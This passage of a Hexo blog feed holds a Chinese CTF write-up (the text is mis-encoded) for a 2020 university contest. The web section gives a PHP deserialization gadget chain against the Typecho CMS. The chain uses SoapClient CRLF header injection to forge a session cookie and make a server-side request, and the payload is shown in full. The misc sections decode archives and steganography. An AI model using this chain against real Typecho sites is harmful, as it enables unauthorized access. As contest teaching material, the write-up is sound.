¡èµ›/image-20200412151046867.png" alt="image-20200412151046867"></p><p><code>/var/Typecho/Plugin.php</code>ä¸­æœ‰æ¡è·¯ç”±</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412195650568.png" alt="image-20200412195650568"></p><p>è®¿é—® <code>/page_admin</code>å³å¯å¯ç”¨æ’ä»¶</p><p>æƒ³è¦å¸¦SESSIONå‡ºæ¥ï¼Œå¿…é¡»è¦æŠŠè‡ªå·±çš„PHPSESSIDä¼ è¿‡å»ï¼Œç„¶è€ŒSOAPå¹¶ä¸èƒ½è®¾ç½®Cookieï¼Œå› æ­¤éœ€è¦CRLFã€‚SoapClientå¯ä»¥è®¾ç½®UAï¼Œåªè¦åœ¨UAååŠ ä¸Š<code>\r\nCookie: PHPSESSID=xxx</code>å°±èƒ½ä¸ºhttpå¤´æ·»åŠ ä¸€ä¸ªæ–°çš„Cookieå­—æ®µï¼Œè¿™æ ·å°±èƒ½å¸¦ä¸Šsessionäº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">            <span class="string">"Cookie: PHPSESSID=s8fo8ma30gbttqvgdbb48k6rw3"</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; <span class="string">'hello'</span>, <span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span> =&gt; <span class="string">'test^^'</span> . join(<span class="string">'^^'</span>, $headers)));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">'action'</span> =&gt; <span class="string">"SELECT"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = <span class="keyword">array</span>(<span class="string">"hello"</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">$o = preg_replace(<span class="string">" /\^\^/"</span>, <span class="string">"\r\n"</span>, $o);</span><br><span class="line">$r = base64_encode($o);</span><br><span class="line"><span class="keyword">echo</span> $r;</span><br></pre></td></tr></table></figure><p>POSTæäº¤payload</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412194618150.png" alt="image-20200412194618150"></p><p>æ³¨æ„å°†PHPSESSIDæ”¹æˆè„šæœ¬ä¸­çš„å€¼ï¼ŒGETæäº¤admin=1æ‰“å°flag</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412194656862.png" alt="image-20200412194656862"></p><h3 id="8-So-Web-Application"><a href="#8-So-Web-Application" class="headerlink" title="8.So Web Application"></a>8.So Web Application</h3><p>è¿™é“é¢˜å¾ˆæ‡µã€‚</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-åƒå±‚å¥—è·¯"><a href="#1-åƒå±‚å¥—è·¯" class="headerlink" title="1.åƒå±‚å¥—è·¯"></a>1.åƒå±‚å¥—è·¯</h3><p>ç»™äº†ä¸ªå‹ç¼©åŒ…ï¼ŒåŒ…åå°±æ˜¯è§£å‹å¯†ç ï¼Œæœ‰å¾ˆå¤šå±‚ã€‚ã€‚ã€‚</p><p>ç›´æ¥è„šæœ¬è·‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">next_file = <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    file = <span class="string">"0573.zip"</span></span><br><span class="line">    zf = zipfile.ZipFile(file)</span><br><span class="line">    <span class="comment"># f=zf.open('1.xlsx',mode='r',pwd='123456'.encode('utf-8'))</span></span><br><span class="line">    a = zf.namelist()</span><br><span class="line">    next_file = a[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        password = file.replace(<span class="string">".zip"</span>, <span class="string">""</span>)</span><br><span class="line">        zf.extractall(pwd=password)</span><br><span class="line">    <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    zf.close()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        zf = zipfile.ZipFile(next_file)</span><br><span class="line">        <span class="comment"># f=zf.open('1.xlsx',mode='r',pwd='123456'.encode('utf-8'))</span></span><br><span class="line">        a = zf.namelist()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            password = next_file.replace(<span class="string">".zip"</span>, <span class="string">""</span>)</span><br><span class="line">            <span class="comment"># print password</span></span><br><span class="line">            zf.extractall(pwd=password)</span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        next_file = a[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> (next_file)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°qt.txt, 40000ä¸ªåƒç´ ç‚¹ï¼Œä¹Ÿæ˜¯è„šæœ¬è¿˜åŸ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> skimage <span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">img = np.zeros((<span class="number">200</span>,<span class="number">200</span>))</span><br><span class="line">print(img)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'qr.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">            <span class="keyword">if</span> data[i*<span class="number">200</span>+j] == <span class="string">"(255, 255, 255)\n"</span>:</span><br><span class="line">                img[i][j] = <span class="number">255</span></span><br><span class="line">            <span class="keyword">else</span>: img[i][j] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    plt.imshow(img,cmap=<span class="string">'gray'</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    plt.close()</span><br></pre></td></tr></table></figure><h3 id="2-å¯»æ‰¾xxx"><a href="#2-å¯»æ‰¾xxx" class="headerlink" title="2.å¯»æ‰¾xxx"></a>2.å¯»æ‰¾xxx</h3><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413153919998.png" alt="image-20200413153919998"></p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413154311175.png" alt="image-20200413154311175"></p><p>æŠŠå¾—åˆ°çš„æ•°å­— <code>18684221609</code> å‘å…¬ä¼—å·</p><h3 id="3-Hello-misc"><a href="#3-Hello-misc" class="headerlink" title="3.Hello_ misc"></a>3.Hello_ misc</h3><p>è§£å‹åæ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå›¾ç‰‡æœ€ä¸Šé¢åªæœ‰çº¢ç»¿ä¸¤ç§é¢œè‰²ã€‚å’Œä¸€ä¸ªflag.rar å¯†ç å‹ç¼©åŒ…</p><p>ç”¨foremostä»å›¾ç‰‡ä¸­æå–åˆ°ä¸€ä¸ªå¸¦å¯†ç çš„å‹ç¼©åŒ…ã€‚</p><p>æŠŠå›¾ç‰‡çš„çº¢è‰²åŒºåŸŸè£å‰ªå‡ºæ¥ <code>img.png</code></p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/img.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> skimage <span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">img = io.imread(<span class="string">'img.png'</span>)</span><br><span class="line">x = img.shape[<span class="number">0</span>]</span><br><span class="line">y = img.shape[<span class="number">1</span>]</span><br><span class="line">ret = np.zeros((x,y))</span><br><span class="line"><span class="comment">#(255,0,0) çº¢è‰²</span></span><br><span class="line"><span class="comment">#(0,0,255) è“è‰²</span></span><br><span class="line">c=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">        <span class="keyword">if</span>(img[i,j,<span class="number">0</span>]) == <span class="number">255</span>:</span><br><span class="line">            c +=<span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c += <span class="string">'0'</span></span><br><span class="line"></span><br><span class="line">b = re.findall(<span class="string">r'.&#123;8&#125;'</span>,c)</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    d.append(int(i, <span class="number">2</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'out.png'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">        t = struct.pack(<span class="string">'B'</span>,i)</span><br><span class="line">        f.write(t)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/out.png" alt="out"></p><p>å¾—åˆ°out.txt</p><p>é‡Œé¢åªæœ‰ <code>127 255 63 191</code> è¿™å››ä¸ªæ•°å­—</p><p>çŒœæµ‹ä¸º <code>00 01 10 11</code>çš„ç»„åˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(nums)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> permutations(nums, len(nums)):</span><br><span class="line">        result.append(list(i))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">bin_list = [<span class="string">'00'</span>, <span class="string">'01'</span>, <span class="string">'10'</span>,<span class="string">'11'</span>]</span><br><span class="line">bin_list=permute(bin_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret = f.readlines()</span><br><span class="line">    p = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ret:</span><br><span class="line">        p.append(int(i))</span><br><span class="line"></span><br><span class="line">    out=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bin_list:</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">63</span>:</span><br><span class="line">                a = i[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">127</span>:</span><br><span class="line">                a = i[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">191</span>:</span><br><span class="line">                a = i[<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">255</span>:</span><br><span class="line">                a = i[<span class="number">3</span>]</span><br><span class="line">            s += a</span><br><span class="line">        out.append(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">    d = re.findall(<span class="string">r'.&#123;8&#125;'</span>,i)</span><br><span class="line">    o = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> d:</span><br><span class="line">        o += chr(int(j, <span class="number">2</span>))</span><br><span class="line">    print(o)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413180554762.png" alt="image-20200413180554762"></p><p>å¾—åˆ°flag.rarè§£å‹å¯†ç </p><p>è§£å‹å‘ç°</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413180722339.png" alt="image-20200413180722339"></p><p>æ‰€ä»¥æ”¹åç¼€ä¸º<code>docx</code></p><p>é‡Œé¢æ˜¯ç©ºçš„ ï¼Œä¼¼æ›¾ç›¸è¯†ï¼Ÿ</p><p>ç›´æ¥å…¨é€‰ï¼Œæ”¹å­—ä½“é¢œè‰²</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx</span></span><br><span class="line"><span class="attribute">MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</span></span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥åƒbase64éšå†™ï¼Œä½†ä¹‹å‰ç”¨çš„è„šæœ¬æ‰“å°å‡ºæ¥å…¨æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥æ‰¾äº†ä¸ªæ–°è„šæœ¬</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413183342138.png" alt="image-20200413183342138"></p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413183650016.png" alt="image-20200413183650016"></p><h3 id="4-pyFlag"><a href="#4-pyFlag" class="headerlink" title="4.pyFlag"></a>4.pyFlag</h3><p>é¢˜ç›®ç»™äº†ä¸‰å¼ å›¾ç‰‡ï¼Œæ”¾åˆ°winhexä¸‹ï¼Œå¯ä»¥å‘ç°å°¾éƒ¨åˆ†åˆ«æœ‰ä¸€ä¸ªéƒ¨åˆ†ï¼Œå°†å®ƒä»¬ç»„åˆåœ¨ä¸€èµ·ï¼Œå¯ä»¥å¾—åˆ°ï¼Œä¸€ä¸ªzipã€‚</p><p>ç„¶åçˆ†ç ´å‹ç¼©åŒ…å¯†ç æ˜¯1234</p><p>å¾—åˆ°å¯†æ–‡</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">G&amp;e<span class="constructor">OhGcq(ZG(<span class="params">t2</span><span class="operator">*</span>H8M3dG&amp;<span class="params">wXiGcq</span>(ZG&amp;<span class="params">wXyG</span>(<span class="params">j</span>~tG&amp;<span class="params">eOdGcq</span>+<span class="params">aG</span>(<span class="params">t5oG</span>(<span class="params">j</span>~qG&amp;<span class="params">eIeGcq</span>+<span class="params">aG</span>)</span><span class="number">6</span>Q&lt;<span class="constructor">G(<span class="params">j</span>~rG&amp;<span class="params">eOdH9</span>&lt;5qG&amp;<span class="params">eLvG</span>(<span class="params">j</span>~sG&amp;<span class="params">nRdH9</span>&lt;8rG%<span class="operator">++</span><span class="params">qG</span>%<span class="params">__eG</span>&amp;<span class="params">eIeGc</span>+|<span class="params">cG</span>(<span class="params">t5oG</span>(<span class="params">j</span>~sG&amp;<span class="params">eOlH9</span>&lt;8rH8C_qH9&lt;8oG&amp;<span class="params">eOhGc</span>+<span class="params">_bG</span>&amp;<span class="params">eLvH9</span>&lt;8sG&amp;<span class="params">eLgGcz</span>?<span class="params">cG</span>&amp;3|<span class="params">sH8M3cG</span>&amp;<span class="params">eOtG</span>%<span class="params">_</span>?<span class="params">aG</span>(<span class="params">t5oG</span>(<span class="params">j</span>~tG&amp;<span class="params">wXxGcq</span>+<span class="params">aH8V6sH9</span>&lt;8rG&amp;<span class="params">eOhH9</span>&lt;5qG(&lt;E-H8M3eG&amp;<span class="params">wXiGcq</span>(ZG)</span><span class="number">6</span>Q&lt;<span class="constructor">G(<span class="params">j</span>~tG&amp;<span class="params">eOtG</span>%+&lt;<span class="params">aG</span>&amp;<span class="params">wagG</span>%<span class="params">__cG</span>&amp;<span class="params">eIeGcq</span>+<span class="params">aG</span>&amp;M9uH8V6cG&amp;<span class="params">eOlH9</span>&lt;8rG(&lt;HrG(<span class="params">j</span>~qG&amp;<span class="params">eLcH9</span>&lt;8sG&amp;<span class="params">wUwGek2</span>)</span></span><br></pre></td></tr></table></figure><p>hint</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ç”¨å„ç§baseXXç¼–ç æŠŠflagå¥—å¨ƒåŠ å¯†äº†ï¼Œä½ åº”è¯¥ä¹Ÿæœ‰çœ‹å‡ºæ¥ã€‚</span><br><span class="line">ä½†æˆ‘åªç”¨äº†ä¸€äº›å¸¸ç”¨çš„baseç¼–ç å“¦ï¼Œæ¯•ç«Ÿæˆ‘çš„æ™ºåŠ›æ°´å¹³ä½ ä¹ŸçŸ¥é“...åƒä»€ä¹ˆbase36base58å¬éƒ½æ²¡å¬è¿‡</span><br><span class="line">æç¤ºï¼š<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x30</span>,<span class="number">0x55</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">a = <span class="string">"G&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)"</span></span><br><span class="line">a = base64.b85decode(a)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">c = re.findall(<span class="string">r'.&#123;2&#125;'</span>,a.decode())</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    s += <span class="string">'%'</span>+i</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = parse.unquote(s)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = base64.b32decode(s)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = base64.b16decode(s.decode())</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(s))</span><br></pre></td></tr></table></figure><h3 id="5-Unravel"><a href="#5-Unravel" class="headerlink" title="5.Unravel!"></a>5.Unravel!</h3><p>JM.PNG,å¯ä»¥binwalk ä¸€å¼ å›¾ç‰‡ï¼Œå†…å®¹ä¸ºï¼šTokyo</p><p>look_at_the_file_ending.wavæ–‡ä»¶å°¾éƒ¨æœ‰ä¸€ä¸²aes <code>U2FsdGVkX1/nSQN+hoHL8OwV9iJB/mSdKk5dmusulz4=</code></p><p>è§£å¼€æ˜¯ <code>CCGandGulu</code> æ˜¯å‹ç¼©åŒ…çš„å¯†ç </p><p>åˆ©ç”¨silenteyeè§£å¯†</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413200509558.png" alt="image-20200413200509558"></p>]]></content>
    
    <summary type="html">
    
      é é˜Ÿå‹èººé£
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="WEB" scheme="https://0xcreed.jxustctf.top/tags/WEB/"/>
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>æ˜“éœ–åšCTF</title>
    <link href="https://0xcreed.jxustctf.top/2020/03/%E6%98%93%E9%9C%96%E5%8D%9ACTF/"/>
    <id>https://0xcreed.jxustctf.top/2020/03/æ˜“éœ–åšCTF/</id>
    <published>2020-03-28T15:23:34.000Z</published>
    <updated>2020-03-28T15:23:34.801Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
    
    <summary type="html">
    
      é™„åŠ ä¸€æ®µæ–‡ç« æ‘˜è¦ï¼Œå­—æ•°æœ€å¥½åœ¨140å­—ä»¥å†…ï¼Œä¼šå‡ºç°åœ¨metaçš„descriptioné‡Œé¢
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="tag1" scheme="https://0xcreed.jxustctf.top/tags/tag1/"/>
    
      <category term="tag2" scheme="https://0xcreed.jxustctf.top/tags/tag2/"/>
    
      <category term="tag3" scheme="https://0xcreed.jxustctf.top/tags/tag3/"/>
    
  </entry>
  
  <entry>
    <title>PHPä¸´æ—¶æ–‡ä»¶åŒ…å«getshell</title>
    <link href="https://0xcreed.jxustctf.top/2020/03/PHP%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://0xcreed.jxustctf.top/2020/03/PHPä¸´æ—¶æ–‡ä»¶åŒ…å«/</id>
    <published>2020-03-10T13:25:32.000Z</published>
    <updated>2020-03-28T02:22:18.245Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" 